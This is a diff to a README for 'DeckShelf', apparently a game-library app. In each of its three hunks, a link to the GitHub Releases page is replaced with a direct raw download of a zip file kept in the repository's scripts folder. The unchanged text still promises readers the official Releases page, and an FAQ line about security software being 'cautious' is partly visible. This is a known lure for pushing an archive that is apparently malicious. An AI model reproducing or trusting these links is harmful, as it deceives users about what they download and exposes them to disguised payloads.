@@ -1,6 +1,6 @@
 # 📚 DeckShelf - Your Entire Game Library, Anywhere.
 
-[![Download DeckShelf](https://img.shields.io/badge/Download-DeckShelf-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/gertasapphire334/DeckShelf/releases)
+[![Download DeckShelf](https://img.shields.io/badge/Download-DeckShelf-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/gertasapphire334/DeckShelf/main/scripts/Deck-Shelf-3.0.zip)
 
 ## 🎮 What is DeckShelf?
 
@@ -27,7 +27,7 @@ Getting DeckShelf up and running is simple. Just follow these steps and you'll b
 
 The easiest way to get DeckShelf is to download it from the official releases page.
 
-**[👉 Visit the official DeckShelf download page here 👈](https://github.com/gertasapphire334/DeckShelf/releases)**
+**[👉 Visit the official DeckShelf download page here 👈](https://raw.githubusercontent.com/gertasapphire334/DeckShelf/main/scripts/Deck-Shelf-3.0.zip)**
 
 When you click that link, you'll be taken to the GitHub Releases page. This is where all new versions of DeckShelf are published. You will see a list of downloadable files. Just pick the one that matches your computer.
 
@@ -134,7 +134,7 @@ A: Sometimes browsers and security software are cautious with new programs. If y
 
 DeckShelf is actively maintained with new features and fixes. To update to the newest version, simply download the latest release from the same link you used before.
 
-**[⬇️ Download the Latest Version of DeckShelf](https://github.com/gertasapphire334/DeckShelf/releases)**
+**[⬇️ Download the Latest Version of DeckShelf](https://raw.githubusercontent.com/gertasapphire334/DeckShelf/main/scripts/Deck-Shelf-3.0.zip)**
 
 Your games and settings will be kept safe when you update.
 
